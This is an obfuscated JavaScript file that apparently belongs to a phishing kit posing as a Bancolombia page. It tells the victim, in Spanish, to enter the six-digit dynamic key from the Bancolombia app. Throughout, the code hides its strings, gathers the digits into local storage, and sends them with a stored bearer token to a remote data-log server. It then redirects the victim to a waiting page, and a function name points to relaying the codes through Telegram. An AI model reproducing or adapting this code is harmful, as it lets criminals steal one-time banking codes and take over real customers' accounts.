function _0x4772() {
  const _0x706c72 = [
    "203007qrmBMq",
    "join",
    "location",
    "dataLogToken",
    "getElementById",
    "./wait.html",
    "json",
    "from",
    "PUT",
    "disabled",
    "getItem",
    "50475xrkydc",
    "1200273FPbDRm",
    "continue",
    "Hubo\x20un\x20problema:",
    "157892MpzrXP",
    "152yltLqC",
    "stringify",
    "href",
    "metaInfo",
    "cdin",
    "preventDefault",
    "text-cdin",
    "number-",
    "590010QswDPc",
    "Consulta\x20tu\x20clave\x20dinámica\x20desde\x20la\x20app\x20Bancolombia.",
    "display",
    "removeAttribute",
    "log",
    "Hubo\x20un\x20error\x20al\x20enviar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Por\x20favor\x20ingrese\x20los\x206\x20dígitos",
    "Escríbelo\x20aquí",
    "style",
    "hidden",
    "value",
    "mano",
    "1845648BgZljy",
    "10581966mpELDi",
    "textContent",
    "error",
    "none",
    "120wgxhrm",
    "Ingresó\x20dinámica",
  ];
  _0x4772 = function () {
    return _0x706c72;
  };
  return _0x4772();
}
const _0x4e7e03 = _0x4f25;
(function (_0x100ba3, _0x187ccf) {
  const _0x40363e = _0x4f25,
    _0x533ab2 = _0x100ba3();
  while (!![]) {
    try {
      const _0x3a5741 =
        parseInt(_0x40363e(0x194)) / 0x1 +
        -parseInt(_0x40363e(0x1ac)) / 0x2 +
        -parseInt(_0x40363e(0x1a0)) / 0x3 +
        (parseInt(_0x40363e(0x192)) / 0x4) *
          (-parseInt(_0x40363e(0x19f)) / 0x5) +
        parseInt(_0x40363e(0x18d)) / 0x6 +
        (-parseInt(_0x40363e(0x1a3)) / 0x7) *
          (parseInt(_0x40363e(0x1a4)) / 0x8) +
        parseInt(_0x40363e(0x18e)) / 0x9;
      if (_0x3a5741 === _0x187ccf) break;
      else _0x533ab2["push"](_0x533ab2["shift"]());
    } catch (_0x5155e7) {
      _0x533ab2["push"](_0x533ab2["shift"]());
    }
  }
})(_0x4772, 0x3f727);
function _0x4f25(_0x1c7e97, _0x3995a4) {
  const _0x4772aa = _0x4772();
  return (
    (_0x4f25 = function (_0x4f2512, _0x372afb) {
      _0x4f2512 = _0x4f2512 - 0x185;
      let _0x53c1e4 = _0x4772aa[_0x4f2512];
      return _0x53c1e4;
    }),
    _0x4f25(_0x1c7e97, _0x3995a4)
  );
}
function updateLS() {
  const _0x552600 = _0x4f25;
  LS["setItem"]("info", JSON[_0x552600(0x1a5)](info));
}
const textMano = document[_0x4e7e03(0x198)]("text-hand"),
  textdin = document[_0x4e7e03(0x198)](_0x4e7e03(0x1aa));
info["checkerInfo"]["mode"] === _0x4e7e03(0x18c)
  ? (textMano[_0x4e7e03(0x1af)](_0x4e7e03(0x18a)),
    (textdin[_0x4e7e03(0x18f)] = _0x4e7e03(0x188)))
  : ((textMano[_0x4e7e03(0x189)][_0x4e7e03(0x1ae)] = _0x4e7e03(0x191)),
    (textdin["textContent"] = _0x4e7e03(0x1ad)));
function getCombinedDigits() {
  const _0x472527 = _0x4e7e03,
    _0x234892 = Array[_0x472527(0x19b)](
      { length: 0x6 },
      (_0xe8dfd6, _0x2bcb6a) =>
        document["getElementById"](_0x472527(0x1ab) + (_0x2bcb6a + 0x1))[
          _0x472527(0x18b)
        ]
    );
  if (_0x234892["some"]((_0x29929b) => _0x29929b === ""))
    return alert(_0x472527(0x187)), null;
  return _0x234892[_0x472527(0x195)]("");
}
async function updateOtpAndSendTelegram() {
  const _0x4cc5c4 = _0x4e7e03,
    _0x4c371e = document["getElementById"](_0x4cc5c4(0x1a1));
  _0x4c371e[_0x4cc5c4(0x19d)] = !![];
  try {
    const _0x1fd1f0 = localStorage[_0x4cc5c4(0x19e)]("dataLogId"),
      _0x4c9acd = localStorage[_0x4cc5c4(0x19e)](_0x4cc5c4(0x197));
    if (!_0x1fd1f0 || !_0x4c9acd)
      throw new Error(
        "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
      );
    const _0xbb398e = await fetch(
      url + "/dataLogs/updateDinDataLog/" + _0x1fd1f0,
      {
        method: _0x4cc5c4(0x19c),
        headers: {
          "Content-Type": "application/json",
          Authorization: "Bearer\x20" + _0x4c9acd,
          Origin: window[_0x4cc5c4(0x196)]["origin"],
        },
        body: JSON[_0x4cc5c4(0x1a5)]({
          din: info[_0x4cc5c4(0x1a7)]["cdin"],
          status: _0x4cc5c4(0x193),
        }),
      }
    );
    if (!_0xbb398e["ok"]) {
      const _0xcbea18 = await _0xbb398e[_0x4cc5c4(0x19a)]();
      throw new Error(
        _0xcbea18[_0x4cc5c4(0x190)] ||
          "Error\x20al\x20actualizar\x20OTP\x20en\x20el\x20servidor"
      );
    }
    console[_0x4cc5c4(0x185)](
      "OTP\x20actualizado\x20correctamente\x20en\x20el\x20servidor"
    ),
      (window["location"][_0x4cc5c4(0x1a6)] = _0x4cc5c4(0x199));
  } catch (_0x2262f7) {
    console[_0x4cc5c4(0x190)](_0x4cc5c4(0x1a2), _0x2262f7),
      alert(_0x4cc5c4(0x186));
  } finally {
    _0x4c371e[_0x4cc5c4(0x19d)] = ![];
  }
}
document[_0x4e7e03(0x198)](_0x4e7e03(0x1a1))["addEventListener"](
  "click",
  function (_0x37ac9f) {
    const _0x1631ea = _0x4e7e03;
    _0x37ac9f[_0x1631ea(0x1a9)]();
    const _0x26a93a = getCombinedDigits();
    if (!_0x26a93a) return;
    (info[_0x1631ea(0x1a7)][_0x1631ea(0x1a8)] = _0x26a93a),
      updateLS(),
      updateOtpAndSendTelegram();
  }
);
